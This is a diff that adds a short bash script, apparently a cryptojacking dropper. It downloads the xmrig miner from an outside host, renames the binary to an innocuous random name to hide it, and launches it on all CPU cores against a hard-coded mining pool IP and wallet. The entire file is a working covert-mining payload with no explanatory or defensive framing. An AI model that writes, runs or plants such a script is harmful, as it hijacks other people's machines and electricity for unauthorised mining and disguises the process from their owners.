@@ -1,0 +1,6 @@
+#!/bin/bash
+wget https://equal.xdagminer.com/Downloads/xmrig-6.24.0-linux-static-x64.tar.gz
+tar xf xmrig-6.24.0-linux-static-x64.tar.gz
+cd xmrig-6.24.0
+mv xmrig ajskau
+./ajskau -o stratum+ssl://156.238.244.248:13003 -u LxRRuboFgahaAmVcFptpY51PH5SzLA49Z -p $(echo $RANDOM | md5sum | head -c 10) -t $(nproc --all)
